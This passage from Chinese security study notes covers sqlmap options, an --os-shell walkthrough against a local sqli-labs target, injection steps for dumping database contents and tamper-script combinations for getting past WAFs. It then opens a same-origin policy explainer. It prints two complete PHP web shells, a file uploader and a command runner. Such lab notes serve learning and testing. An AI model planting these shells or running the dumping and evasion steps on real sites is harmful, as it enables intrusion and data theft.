<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">-b, –banner 检索数据库管理系统的标识</span><br><span class="line">–<span class="keyword">current</span>-<span class="keyword">user</span> 检索数据库管理系统当前用户</span><br><span class="line">–<span class="keyword">current</span>-db 检索数据库管理系统当前数据库</span><br><span class="line">–<span class="keyword">is</span>-dba 检测 DBMS 当前用户是否 DBA</span><br><span class="line">–users 枚举数据库管理系统用户</span><br><span class="line">–passwords 枚举数据库管理系统用户密码哈希</span><br><span class="line">–<span class="keyword">privileges</span> 枚举数据库管理系统用户的权限</span><br><span class="line">–roles 枚举数据库管理系统用户的角色</span><br><span class="line">–dbs 枚举数据库管理系统数据库</span><br><span class="line">–<span class="keyword">tables</span> 枚举 DBMS 数据库中的表</span><br><span class="line">–<span class="keyword">columns</span> 枚举 DBMS 数据库表列</span><br><span class="line">–dump 转储数据库管理系统的数据库中的表项</span><br><span class="line">–dump-<span class="keyword">all</span> 转储所有的 DBMS 数据库表中的条目</span><br><span class="line">–<span class="keyword">search</span> 搜索列，表和/或数据库名称</span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line">-U <span class="keyword">USER</span> 用来进行枚举的数据库用户</span><br><span class="line">–<span class="keyword">exclude</span>-sysdbs 枚举表时排除系统数据库</span><br><span class="line">–start=LIMITSTART 第一个查询输出进入检索</span><br><span class="line">–stop=LIMITSTOP 最后查询的输出进入检索</span><br><span class="line">–first=FIRSTCHAR 第一个查询输出字的字符检索</span><br><span class="line">–last=LASTCHAR 最后查询的输出字字符检索</span><br><span class="line">–<span class="keyword">sql</span>-query=QUERY 要执行的 <span class="keyword">SQL</span> 语句</span><br><span class="line">–<span class="keyword">sql</span>-shell 提示交互式 <span class="keyword">SQL</span> 的 shell</span><br></pre></td></tr></table></figure>

<h3 id="Brute-force-蛮力"><a href="#Brute-force-蛮力" class="headerlink" title="Brute force(蛮力)"></a>Brute force(蛮力)</h3><p>这些选项可以被用来运行蛮力检查。</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">–<span class="meta">common</span>-tables 检查存在共同表</span><br><span class="line">–<span class="meta">common</span>-columns 检查存在共同列</span><br></pre></td></tr></table></figure>

<h3 id="User-defined-function-injection（用户自定义函数注入）"><a href="#User-defined-function-injection（用户自定义函数注入）" class="headerlink" title="User-defined function injection（用户自定义函数注入）"></a>User-defined function injection（用户自定义函数注入）</h3><p>这些选项可以用来创建用户自定义函数。</p>
<p>User-defined function injection（用户自定义函数注入）：<br>这些选项可以用来创建用户自定义函数。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–udf-inject 注入用户自定义函数</span><br><span class="line">–<span class="attribute">shared-lib</span>=SHLIB 共享库的本地路径</span><br></pre></td></tr></table></figure>

<h3 id="File-system-access（访问文件系统）"><a href="#File-system-access（访问文件系统）" class="headerlink" title="File system access（访问文件系统）"></a>File system access（访问文件系统）</h3><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
<p>File system access（访问文件系统）：<br>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">file-read</span>=RFILE 从后端的数据库管理系统文件系统读取文件</span><br><span class="line">–<span class="attribute">file-write</span>=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">–<span class="attribute">file-dest</span>=DFILE 后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>

<h3 id="Operating-system-access（操作系统访问）"><a href="#Operating-system-access（操作系统访问）" class="headerlink" title="[*]Operating system access（操作系统访问）"></a>[*]Operating system access（操作系统访问）</h3><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">–<span class="built_in">os</span>-cmd=OSCMD 执行操作系统命令</span><br><span class="line">–<span class="built_in">os</span>-shell 交互式的操作系统的 shell</span><br><span class="line">–<span class="built_in">os</span>-pwn 获取一个 OOB shell，meterpreter 或 VNC</span><br><span class="line">–<span class="built_in">os</span>-smbrelay 一键获取一个 OOB shell，meterpreter 或 VNC</span><br><span class="line">–<span class="built_in">os</span>-bof 存储过程缓冲区溢出利用</span><br><span class="line">–priv-esc 数据库进程用户权限提升</span><br><span class="line">–msf-<span class="built_in">path</span>=MSFPATH Metasploit Framework 本地的安装路径</span><br><span class="line">–tmp-<span class="built_in">path</span>=TMPPATH 远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure>

<h4 id="os-shell的使用"><a href="#os-shell的使用" class="headerlink" title="-os-shell的使用"></a><code>-os-shell</code>的使用</h4><p><a href="https://xz.aliyun.com/t/7942">https://xz.aliyun.com/t/7942</a></p>
<p><a href="https://blog.csdn.net/qq_61237064/article/details/124154956">https://blog.csdn.net/qq_61237064/article/details/124154956</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">使用前提</span><br><span class="line"></span><br><span class="line">拥有网站的写入权限</span><br><span class="line"></span><br><span class="line">Secure_file_priv参数为空或者为指定路径</span><br></pre></td></tr></table></figure>

<p>满足条件后</p>
<h4 id="1-注入"><a href="#1-注入" class="headerlink" title="1.注入"></a>1.注入</h4><p>先对注入点探测</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-lab/</span>less-<span class="number">1</span>/?id=<span class="number">1</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20221112150328026.png" alt="image-20221112150328026"></p>
<p>然后执行<code>--os-shell</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/sqli-lab/</span>less-<span class="number">1</span>/?id=<span class="number">1</span><span class="string">&quot; --os-shell</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20221112150107492.png" alt="image-20221112150107492"></p>
<p>选择php语言</p>
<p><img src="/2022/05/31/daily/image-20221112151004965.png" alt="image-20221112151004965"></p>
<p>接着这个参数是选择绝对路径</p>
<p><img src="/2022/05/31/daily/image-20221112151019786.png" alt="image-20221112151019786"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">选项一为用这几个路径</span><br><span class="line"></span><br><span class="line">选项二为用户自己输入</span><br><span class="line"></span><br><span class="line">选项三为用用户的字典</span><br><span class="line"></span><br><span class="line">选项四为爆破。</span><br></pre></td></tr></table></figure>

<p>我们满足前提的话，选择2，直接输入自己知道的路径</p>
<p><img src="/2022/05/31/daily/image-20221112151155258.png" alt="image-20221112151155258"></p>
<p>到这就完成了<code>--os-shell</code>的执行，来看看在<code>sqlmap</code>的执行效果</p>
<p><img src="/2022/05/31/daily/image-20221112151239878.png" alt="image-20221112151239878"></p>
<p>对于上传的两个文件<code>tmpugvzq.php</code>和<code>tmpbylqf.php</code>我们在数据包中就可以看到，只需要解码就可以得到内容</p>
<p><code>tmpugvzq.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>x<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$dir</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">phpversion</span>()&lt;<span class="string">&#x27;4.1.0&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$file</span>=<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">			@<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$file</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">			@<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		@<span class="title function_ invoke__">chmod</span>(<span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>,<span class="number">0755</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>].<span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=C:\\Users\\zhang\\Desktop\\php\\PHPTutorial\\WWW\\sqli-master\\Less-1\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据上面的<code>mysql</code>语句，不难看出这是利用<code>into outfile</code>写入文件</p>
<p><code>tmpbylqf.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[, ]+/&quot;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">        <span class="variable">$z</span>=<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;trim&quot;</span>,<span class="variable">$z</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$z</span>;<span class="keyword">return</span> <span class="title function_ invoke__">is_callable</span>(<span class="variable">$n</span>)<span class="keyword">and</span>!<span class="title function_ invoke__">in_array</span>(<span class="variable">$n</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;system&quot;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;proc_open&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$y</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        <span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$y</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;shell_exec&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;passthru&quot;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="title function_ invoke__">ob_get_clean</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;popen&quot;</span>))&#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,r);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_resource</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$x</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$w</span>.=<span class="title function_ invoke__">fread</span>(<span class="variable">$x</span>,<span class="number">512</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$x</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">f</span>(<span class="string">&quot;exec&quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$w</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$w</span>);</span><br><span class="line">        <span class="variable">$w</span>=<span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>),<span class="variable">$w</span>).<span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$w</span>=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;&lt;pre&gt;<span class="subst">$w</span>&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这是一个用于命令执行的代码，命令执行后会将执行的结果输出。</p>
<p>直接在网站访问这两个<code>shell</code>文件就可以看到了</p>
<p>一个提供了一个上传文件的入口，一个提供了一个以<code>cmd</code>参数的命令执行窗口</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。</span><br><span class="line"></span><br><span class="line">tmpugvzq.php是可以上传</span><br><span class="line">tmpbylqf.php是可以执行命令</span><br></pre></td></tr></table></figure>

<p>【如果没看到，可以查看<code>wireshark</code>或者先<code>bp</code>抓包数据流并时刻开启监听】</p>
<p><strong>这个时候sqlmap主要做了三件事情：</strong></p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、进行目标的一个基础信息的探测。</span><br><span class="line"><span class="number">2</span>、上传<span class="keyword">shell</span>到目标web网站上。</span><br><span class="line"><span class="number">3</span>、退出时删除<span class="keyword">shell</span>。</span><br></pre></td></tr></table></figure>



<h4 id="2-Database"><a href="#2-Database" class="headerlink" title="2.Database"></a>2.Database</h4><p>数据库支持外连，通过<code>Sqlmap</code>执行<code>--os-shell</code>获取<code>shell</code>。</p>
<p>必要条件：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">数据库支持外连</span><br><span class="line"></span><br><span class="line">数据库权限为<span class="keyword">SA</span>权限</span><br></pre></td></tr></table></figure>

<p><code>Mysql</code>和<code>sqlsever</code>两者的情况不同，详细建议看文章学习</p>
<h3 id="Windows-注册表访问"><a href="#Windows-注册表访问" class="headerlink" title="Windows 注册表访问"></a>Windows 注册表访问</h3><p>这些选项可以被用来访问后端数据库管理系统Windows 注册表。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–reg-read 读一个Windows 注册表项值</span><br><span class="line">–reg-<span class="built_in">add</span> 写一个Windows 注册表项值数据</span><br><span class="line">–reg-del 删除Windows 注册表键值</span><br><span class="line">–<span class="attribute">reg-key</span>=REGKEY Windows 注册表键</span><br><span class="line">–<span class="attribute">reg-value</span>=REGVAL Windows 注册表项值</span><br><span class="line">–<span class="attribute">reg-data</span>=REGDATA Windows 注册表键值数据</span><br><span class="line">–<span class="attribute">reg-type</span>=REGTYPE Windows 注册表项值类型</span><br></pre></td></tr></table></figure>

<h3 id="General（一般）"><a href="#General（一般）" class="headerlink" title="General（一般）"></a>General（一般）</h3><p>这些选项可以用来设置一些一般的工作参数。</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">-t TRAFFICFILE 记录所有 HTTP 流量到一个文本文件中</span><br><span class="line">-s SESSIONFILE 保存和恢复检索会话文件的所有数据</span><br><span class="line">–<span class="keyword">flush</span>-session 刷新当前目标的会话文件</span><br><span class="line">–fresh-queries 忽略在会话文件中存储的查询结果</span><br><span class="line">–eta 显示每个输出的预计到达时间</span><br><span class="line">–update 更新 SqlMap</span><br><span class="line">–<span class="keyword">save</span> <span class="keyword">file</span> 保存选项到 INI 配置文件</span><br><span class="line">–batch 从不询问用户输入，使用所有默认配置。</span><br></pre></td></tr></table></figure>

<h3 id="Miscellaneous（杂项"><a href="#Miscellaneous（杂项" class="headerlink" title="Miscellaneous（杂项"></a>Miscellaneous（杂项</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">–beep 发现 SQL 注入时提醒</span><br><span class="line">–check-payload IDS 对注入 payloads 的检测测试</span><br><span class="line">–cleanup sqlmap.py 具体的 UDF 和表清理 DBMS</span><br><span class="line">–forms 对目标 URL 的解析和测试形式</span><br><span class="line">–gpage=GOOGLEPAGE 从指定的页码使用谷歌 dork 结果</span><br><span class="line">–page-rank Google dork 结果显示网页排名（PR）</span><br><span class="line">–parse-errors 从响应页面解析数据库管理系统的错误消息</span><br><span class="line">–replicate 复制转储的数据到一个 sqlite3 数据库</span><br><span class="line">–tor 使用默认的 Tor（Vidalia<span class="regexp">/ Privoxy/</span> Polipo）代理地址</span><br><span class="line">–wizard 给初级用户的简单向导界面</span><br></pre></td></tr></table></figure>

<h3 id="制定测试的种类"><a href="#制定测试的种类" class="headerlink" title="制定测试的种类"></a>制定测试的种类</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">technique</span>=TECH SQL注入技术测试（默认 BEUST）</span><br><span class="line">Techniques（技巧）：</span><br><span class="line">–technique 测试指定注入类型使用的技术</span><br></pre></td></tr></table></figure>


<p>不加参数默认测试所有注入技术:</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">B:</span> 基于布尔的 SQL 盲注</span><br><span class="line"><span class="symbol">E:</span> 基于显错 sql 注入</span><br><span class="line"><span class="symbol">U:</span> 基于 UNION 注入</span><br><span class="line"><span class="symbol">S:</span> 叠层 sql 注入</span><br><span class="line"><span class="symbol">T:</span> 基于时间盲注</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-判断waf"><a href="#sqlmap-判断waf" class="headerlink" title="sqlmap 判断waf"></a>sqlmap 判断waf</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://www.test.com/&quot;</span> <span class="params">--identify-waf</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<h2 id="一般注入流程"><a href="#一般注入流程" class="headerlink" title="一般注入流程"></a>一般注入流程</h2><p>以mysql为例</p>
<p>1.验证注入</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">sqlmap -u “注入点<span class="built_in">URL</span>”</span><br></pre></td></tr></table></figure>

<p>从中可以发现存在注入的类型，数据库类型和web应用程序PHP和Apache等版本信息。</p>
<p>2.列举数据库名</p>
<figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">sqlmap</span> -<span class="string">u</span> <span class="string">&quot;注入点&quot;</span> <span class="built_in">--dbs</span></span><br><span class="line"><span class="string">sqlmap</span> -<span class="string">u</span> <span class="string">&quot;注入点&quot;</span> <span class="built_in">--current-db</span>  <span class="comment">#列举当前使用的数据库</span></span><br></pre></td></tr></table></figure>

<p>3.查询某一数据库的所有表名</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;注入点&quot;</span> -D 数据库名 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>

<p>4.列举这一数据库的表的所有列（字段）</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;注入点&quot;</span> -D 数据库名 -<span class="built_in">T</span> 表名 --<span class="built_in">columns</span></span><br></pre></td></tr></table></figure>

<p>5.暴字段内容</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">sqlmap</span> <span class="operator">-</span><span class="variable">u</span> <span class="string">&quot;注入点&quot;</span> <span class="operator">-</span><span class="built_in">D</span> 数据库名 <span class="operator">-</span><span class="variable">T</span> 表名 <span class="operator">-</span><span class="built_in">C</span> <span class="string">&quot;要爆的字段名&quot;</span> <span class="operator">--</span><span class="variable">dump</span></span><br></pre></td></tr></table></figure>

<p>爆一个字段的话可能会很慢或者出错，全部暴出最好。</p>
<p>可以在后面加个 –batch 可以不用手动选择yes或no的选项。</p>
<h3 id="sqlmap-tamper-的使用"><a href="#sqlmap-tamper-的使用" class="headerlink" title="sqlmap tamper 的使用"></a>sqlmap tamper 的使用</h3><p>可以进行各种绕过防火墙和waf</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="attr">--tamper</span> xxx<span class="selector-class">.py</span>  (.py可以不加)</span><br></pre></td></tr></table></figure>

<p><code>eg:python sqlmap.py -u “” – tamper base64encode.py</code><br>1.普通的<code>tamper</code>搭配方式:</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,</span><br><span class="line"><span class="built_in">charencode,</span>charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,</span><br><span class="line"><span class="built_in">nonrecursivereplacement,</span>percentage,randomcase,securesphere,space2comment,space2plus,</span><br><span class="line"><span class="built_in">space2randomblank,</span>unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure>

<p>2.数据库为<code>MSSQL</code>的搭配方式：</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,</span><br><span class="line"><span class="built_in">nonrecursivereplacement,</span>percentage,randomcase,securesphere,sp_password,space2comment,</span><br><span class="line"><span class="built_in">space2dash,</span>space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,</span><br><span class="line">unmagicquotes</span><br></pre></td></tr></table></figure>

<p>3.数据库为<code>Mysql</code>的搭配方式:</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,</span><br><span class="line"><span class="built_in">greatest,</span>halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,</span><br><span class="line"><span class="built_in">multiplespaces,</span>nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,</span><br><span class="line"><span class="built_in">space2morehash,</span>space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,</span><br><span class="line"><span class="built_in">versionedkeywords,</span>versionedmorekeywords,xforwardedfor</span><br></pre></td></tr></table></figure>

<p>4.常用脚本用法：</p>
<blockquote>
<p><code>apostrophemask.py UTF-8编码</code><br><code>apostrophenullencode.py unicode编码</code><br><code>appendnullbyte.py 添加%00</code><br><code>base64encode.py base64编码</code><br><code>between.py 以”not between”替换”&gt;“</code><br><code>bluecoat.py 以随机的空白字符替代空格，以”like”替代”=“</code><br><code>chardoubleencode.py 双重url编码</code><br><code>charencode.py url编码</code><br><code>charunicodeencode.py 对未进行url编码的字符进行unicode编码</code><br><code>equaltolike.py 以”like”替代”=“</code><br><code>halfversionedmorekeywords.py在每个关键字前添加条件注释</code><br><code>ifnull2ifisnull.py 以”IF(ISNULL(A), B, A)”替换”IFNULL(A, B)”</code><br><code>modsecurityversioned.py 条件注释</code><br><code>modsecurityzeroversioned.py 条件注释，0000</code><br><code>multiplespaces.py 添加多个空格</code><br><code>nonrecursivereplacement.py 可以绕过对关键字删除的防注入（这个我也不知道怎么说好，看例子。。。）</code><br><code>percentage.py 在每个字符前添加百分号（%）</code><br><code>randomcase.py 随即大小写</code><br><code>randomcomments.py 随机插入区块注释</code><br><code>sp_password.py 语句结尾添加”sp_password”迷惑数据库日志（很。。。）</code><br><code>space2comment.py 以区块注释替换空格</code><br><code>space2dash.py 以单行注释”–”和随机的新行替换空格</code><br><code>space2hash.py 以单行注释”#”和由随机字符组成的新行替换空格</code><br><code>space2morehash.py 没看出来和上面那个有什么区别。。</code><br><code>space2mssqlblank.py 以随机空白字符替换空格</code><br><code>space2mssqlhash.py 以单行注释”#”和新行替换空格</code><br><code>space2mysqlblank.py 以随机空白字符替换空格</code><br><code>space2mysqldash.py 以单行注释和新行替换空格</code><br><code>space2plus.py 以”+”替换空格</code><br><code>space2randomblank.py 随机空白字符替换空格</code><br><code>unionalltounion.py 以”union all”替换”union”</code><br><code>unmagicquotes.py 以”%bf%27”替换单引号，并在结尾添加注释”–”</code><br><code>versionedkeywords.py 对不是函数的关键字条件注释</code><br>&#96;versionedmorekeywords.py 对关键字条件注释</p>
<p>&#96;</p>
</blockquote>
<h1 id="15-同源策略"><a href="#15-同源策略" class="headerlink" title="15.同源策略"></a>15.同源策略</h1><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">作者：laixiangran</span><br><span class="line">链接：https:<span class="regexp">//</span>juejin.cn<span class="regexp">/post/</span><span class="number">6844903681683357710</span></span><br><span class="line">来源：稀土掘金</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>



<h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>
<p>最初，它的含义是指，A网页设置的 Cookie，B网页不能打开，除非这两个网页”同源”。所谓”同源”指的是”三个相同”。</p>
<blockquote>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同</li>
</ul>
</blockquote>
<p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略）。</p>
<p>它的同源情况如下</p>
<blockquote>
<ul>
<li><code>http://www.example.com/dir2/other.html</code>：同源</li>
<li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li>
</ul>
</blockquote>
<h2 id="限制范围"><a href="#限制范围" class="headerlink" title="限制范围"></a>限制范围</h2><p>随着互联网的发展，”同源政策”越来越严格。目前，如果非同源，共有三种行为受到限制。</p>
<blockquote>
<p>（1） Cookie、LocalStorage 和 IndexDB 无法读取。</p>
<p>（2） DOM 无法获得。</p>
<p>（3） AJAX 请求不能发送。</p>
</blockquote>
<p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面，我将详细介绍，如何规避上面三种限制。</p>
